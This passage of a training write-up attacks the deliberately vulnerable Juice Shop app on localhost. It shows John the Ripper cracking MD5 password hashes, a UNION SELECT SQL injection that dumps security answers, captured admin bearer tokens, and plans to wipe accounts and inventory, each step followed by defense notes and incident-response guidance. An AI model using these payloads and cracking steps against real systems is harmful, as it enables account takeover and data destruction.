Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NTk1MDYzNH0.CxJ9Csv8FhyKlUUto6cT5bbkKaG4-d9MnwA_5uDpvAzaBMQSY8ggPZs19249S1lFcjjQ7I0B7hFhyXMFzYD8IDIn7D0Vkb5LBbuX9cGa1lnQMAyIkCikuGkQwaa9eDDX4-2LRAdeCeXaDW8JwqE8cMsFVkYZR9M19uS0d6oZlmg
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss
Connection: keep-alive


```

### Step 23: Password Exfiltration & Offline Cracking
This resulted in an output that gave me email addresses in the name box and password hashes in the description box. With this newfound information, I took the data over to John the Ripper to start brute forcing offline, focusing on the CISO password. To start, I copied the password hash and saved it to a file with `echo "861917d5fa5f1172f931dc700d81a8fb" > hash.txt`. Since this is an MD5 hash, I can tell John specifically what we're working with to save time. The command for this step is `john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`. 

After trying the CISO's password, I confirmed it wasn't in rockyou.txt. This isn't a huge deal since I'm still able to get into the account via SQLi, but I can't reach my next goal without the plaintext password. Moving on, I tried the admin's password. This worked and was as simple as two commands. The whole interaction looked like this:
```
┌──(kali㉿kali)-[~]
└─$ echo "0192023a7bbd73250516f069df18b500" > hash.txt
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
admin123         (?)     
1g 0:00:00:00 DONE (2026-04-12 18:15) 20.00g/s 1800Kp/s 1800Kc/s 1800KC/s austin24..SEXYBABE
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

#### **Defense Note**
This final compromise is the result of Weak Hashing Algorithms and a poor Password Policy. Using MD5 for password storage is a critical vulnerability because it is computationally cheap and highly susceptible to rapid offline cracking using tools like John the Ripper. To fix this, the application must migrate to a modern, slow-hashing algorithm like Argon2 or bcrypt, which are specifically designed to resist brute-force attacks. Additionally, the organization should enforce a strong password policy that mandates complexity and length to defeat simple wordlist attacks like `rockyou.txt`, while requiring Multi-Factor Authentication (MFA) to ensure that even a cracked password isn't enough to gain access to the system.

### Step 24: Pivot to Persistence
I confirmed by successfully logged into the admin account using the credentials I found, but I quickly realized that the platform's data erasure feature required a security answer rather than a standard password. To achieve my goal of a total lockout and data wipe, I had to pivot my strategy. I returned to my exfiltration method to target the security question hashes for the admin and executive accounts.
```
GET /rest/products/search?q=test%27))%20UNION%20SELECT%201,%20u.email,%20s.answer,%204,%205,%206,%207,%208,%209%20FROM%20Users%20u%20JOIN%20SecurityAnswers%20s%20ON%20u.id%20=%20s.UserId-- HTTP/1.1
Host: localhost:3000
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMTEgMjI6MTE6MDYuODg2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NTk1MDYzNH0.CxJ9Csv8FhyKlUUto6cT5bbkKaG4-d9MnwA_5uDpvAzaBMQSY8ggPZs19249S1lFcjjQ7I0B7hFhyXMFzYD8IDIn7D0Vkb5LBbuX9cGa1lnQMAyIkCikuGkQwaa9eDDX4-2LRAdeCeXaDW8JwqE8cMsFVkYZR9M19uS0d6oZlmg
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss
Connection: close


```

#### **Defense Note**
This pivot highlights a critical failure in Secondary Authentication Security. Even though the application attempted to add a layer of protection via security questions, the answers were stored using the same weak hashing methods as the passwords and were accessible via the same SQL Injection vulnerability. To fix this, security answers should be treated with the same level of protection as primary credentials, including the use of Strong, Salled Hashes like bcrypt. Furthermore, organizations should move away from predictable security questions entirely in favor of Multi-Factor Authentication (MFA) apps or hardware keys, as personal answers are often easily discovered through social engineering or, as seen here, direct database exfiltration.

### Step 25: Admin Takeover & Total Data Erasure
This gave me a clear look at everyone's email and an SHA256 hash of their security answers. Continuing to work with the admin account, I managed to crack the hash "db8b1e81c9a3e9ed03ae162f3197209977bc68c5b095c6ed4d163baa653f48a0" which resulted in the plaintext "patterson". 

With this new list of hashes and associated emails, I'm able to use the data erasure request feature to delete any account. This would only take as long as it takes to crack the answers. While these are stronger hashes than MD5 and require more time to crack, it's now possible to mark all items down to $0.00, buy the entire inventory, delete all listings, and wipe the accounts. I also found deluxe codes during my searches, meaning I could've easily upgraded my own account to an admin with a deluxe membership. At this stage, nobody would be able to access the app anymore and the inventory would be wiped clean.

#### **Defense Note**
The final impact of this attack is a total Denial of Service (DoS) and Data Destruction made possible by flawed account recovery and privilege management. Even though a stronger hashing algorithm like SHA256 was used for the security answers, it was still vulnerable to offline cracking because the answers themselves, like a simple name, lack the entropy needed to resist brute force. To prevent a total takeover, the application should implement Rate Limiting and Account Lockouts on the data erasure and password recovery features to stop automated attempts. Most importantly, the platform should adopt a Least Privilege model where even an administrative account requires MFA Verification or administrative "dual-control" to perform irreversible actions like mass data erasure or inventory wipes.

---

## Defensive Analysis
### Framework Alignment & Technical Gaps
- **MITRE ATT&CK Mapping**
  - **T1566 (Phishing)**: The delivery vector used to trick a high-privileged user into clicking the malicious XSS link.
  - **T1539 (Steal Web Session Cookie)**: The primary goal of the XSS; capturing the JWT to hijack the user's session without needing a password.
  - **T1557 (AitM)**: Used to bypass the Same-Origin Policy, allowing the attacker to intercept data between the browser and the server.
  - **T1059 (SQLi)**: Represents the SQLi phase where the attacker "speaks" directly to the database to execute unauthorized commands.
- **ISO 27001 Annex A Gaps**
  - **A.8.25 (Secure Development)**: A failure to implement mandatory input validation and output encoding during the coding lifecycle.
  - **A.8.3 (Information Taxonomy/PII Protection)**: A classification failure where sensitive PII (hashes and security answers) lacked the strict access controls required for high-value data.

### Strategic Defensive Summary
1. **The Crunchy Shell Failure**
- **The Flaw**: The attack succeeded because of a lack of Defense in Depth. Once the perimeter was breached via XSS, there were no internal checks to stop lateral movement. 
- **The Fix**: Moving toward Micro-Segmentation and a Zero Trust model where high-risk actions (like account erasure) require Step-Up MFA.

2. **The Telemtry Gap**
- **The Flaw**: The attack wasn’t a single event, but a chain of low-severity alerts. Without a SIEM to correlate the IP [X] XSS trigger with the IP [X] IDOR probing, the SOC is blind to it. 
- **The Fix**: Centralized logging and behavioral analysis to link isolated events into a single coordinated attack story. 

3. **The Fallacy of Client Trust**
- **The Flaw**: Every phase exploited the system’s inherent trust in client-supplied data (IDs, emails, logic). 
- **The Fix**: Enforce Server-Side Truth. Never trust anything that comes from a URL, JSON body, or cookies without independent verification on the backend. 

### Detecting & Preventing This Attack
1. **Prevention**
- **Secure Header Implementation**: Deploying a Content Security Policy (CSP) to restrict script execution and using HttpOnly/Secure flags on cookies to prevent JWT theft via XSS. 
  - **Note**: This kills the primary entry vector by ensuring that even if a malicious script is injected, it can’t call home with the user’s session cookie. 
- **Input Parameterization & Encoding**: Transitioning all database interactions to Parameterized Queries and ensuring context-aware output encoding. 
  - **Note**: This addresses the root cause of SQLi by treating user input as data rather than executable code. 
- **Indirect Object References (Mapping)**: Replacing internal database IDs with session-based temporary keys or UUIDs. 
  - **Note**: This prevents ID Walking by making it mathematically impossible for a threat actor to guess the next valid resource identifier. 

2. **Detection**
- **API Logic Correlation**: Monitoring for mismatches between the authentication Session_User_ID and the requested Object_Owner_ID.
  - **Note**: This turns a silent IDOR into a high-confidence alert. If User 101 asks for a resource belonging to User 202, the system should log an authorization failure immediately. 
- **Anomaly Detection for ID Walking**: Setting thresholds in the SIEM for sequential browsing (such as more than 10 unique resource IDs accessed by one IP in under a minute).
  - **Note**: When a single IDOR request is quiet, the pattern of scanning hundreds of carts is a loud behavioral signature of a scraper or threat actor. 
- **Signature-Based Web Filtering**: Configuring the WAF to alert on common SQLi patterns (UNION SELECT, or ’ OR 1=1) and encoded XSS payloads. 
  - **Note**: This provides a first-line tripwire that catches known attack strings before they even reach the application logic. 

### Mitigation & Incident Response
1. **Immediate Containment**
- **Universal Session Revocation**: Invoking a protocol to instantly invalidate all active JWTs and refresh tokens for the compromised account. 
  - **Note**: This is the most effective way to boot a threat actor who’s using stolen sessions. 
- **IP-Based Shunning**: Temporarily blocking the attacking IP at the edge firewall or WAF once the ID Walking or SQLi behavior is confirmed. 
  - **Note**: This buys the team time to analyze the logs without further interference from the same source. 

2. **Eradication & Recovery**
- **Force Credential Reset**: Requiring a password and security question update for any accounts that the analysis shows were touched by the attacker. 
  - **Note**: Because the attacker dumped security answers as well, a password reset alone isn’t enough; presumably everything needs to be reset. 
- **Database Integrity Audit**: Running scripts to identify and revert unauthorized data changes, such as the price manipulation or account deletions.
  - **Note**: This ensures the business logic is restored to a Known Good state before the application is fully back online.

4. **Post-Incident Review**
- **Root Cause Analysis (RCA)**: Mapping the chain back to the specific line of code or misconfiguration that allowed the initial XSS. 
- **Telemetry Enhancement**: Updating the logging baseline to ensure that similar logic-based attacks (like the business logic abuse) are logged more ganularly in the future. 

---

## Final Takeaways 
1. **Vulnerabilities Don’t Exist in Isolation**
A medium or low severity bug is rarely the end of the story. As we saw, a single XSS link can be the gateway to full domain compromise when changed with things like IDOR or SQLi. 
- **The Lesson**: Assess the context, not just the CVSS score. 

2. **Defense in Depth is a Requirement, not an Option**
Relying on a crunch shell, like a WAF or firewall, is a recipe for disaster. Security must be baked into every layer of the application. 
- **The Lesson**: If the perimeter fails, internal checks, like Micr-Segmentation and Step-Up MFA, are the only thing standing between a minor incident and a front-page data breach. 

3. **Telemetry is the Blue Team’s Best Friend**
An attacker can be silent, but they’re rarely invisible. The crumbs left behind during recon and ID Walking are detectable if you have the right logging and correlation in place. 
- **The Lesson**: A SOC is only as good as its visibility. Focus on behavioral analysis to catch the patterns that automated scanners miss. 

4. **The Golden Rule: Never Trust the Client**
When it’s a URL parameter, a cookie, or a JSON body, if it comes from the user, it’s potentially malicious. 
- **The Lesson**: Server-Side Truth is the only truth. Always validate ownership and sanitize input on the backend. 
